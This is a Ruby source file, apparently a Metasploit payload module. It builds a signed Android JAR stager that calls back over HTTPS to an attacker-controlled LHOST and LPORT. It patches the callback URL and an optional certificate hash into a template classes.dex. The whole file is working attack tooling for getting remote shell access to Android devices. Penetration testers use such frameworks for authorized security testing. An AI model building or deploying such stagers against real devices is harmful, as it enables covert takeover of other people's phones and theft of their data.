##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_https'

module Metasploit3

  CachedSize = :dynamic

  include Msf::Payload::Stager
  include Msf::Payload::Dalvik

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Dalvik Reverse HTTPS Stager',
      'Description'   => 'Tunnel communication over HTTPS',
      'Author'        => 'anwarelmakrahy',
      'License'       => MSF_LICENSE,
      'Platform'      => 'android',
      'Arch'          => ARCH_DALVIK,
      'Handler'       => Msf::Handler::ReverseHttps,
      'Stager'        => {'Payload' => ""}
    ))
  end

  def generate_jar(opts={})
    # Default URL length is 30-256 bytes
    uri_req_len = 30 + rand(256-30)
    # Generate the short default URL if we don't know available space
    if self.available_space.nil?
      uri_req_len = 5
    end

    lurl = "ZZZZhttps://#{datastore["LHOST"]}"
    lurl << ":#{datastore["LPORT"]}" if datastore["LPORT"]
    lurl << "/"
    lurl << generate_uri_checksum(Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITJ, uri_req_len)

    classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'), {:mode => 'rb'})
    string_sub(classes, 'ZZZZ' + ' ' * 512, lurl)

    verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
                                         datastore['HandlerSSLCert'])
    if verify_cert_hash
        hash = 'WWWW' + verify_cert_hash.unpack("H*").first
        string_sub(classes, 'WWWW                                        ', hash)
    end

    apply_options(classes)

    jar = Rex::Zip::Jar.new
    jar.add_file("classes.dex", fix_dex_header(classes))
    files = [
      [ "AndroidManifest.xml" ],
      [ "resources.arsc" ]
    ]
    jar.add_files(files, File.join(Msf::Config.install_root, "data", "android", "apk"))
    jar.build_manifest

    cert, key = generate_cert
    jar.sign(key, cert, [cert])

    jar
  end
end
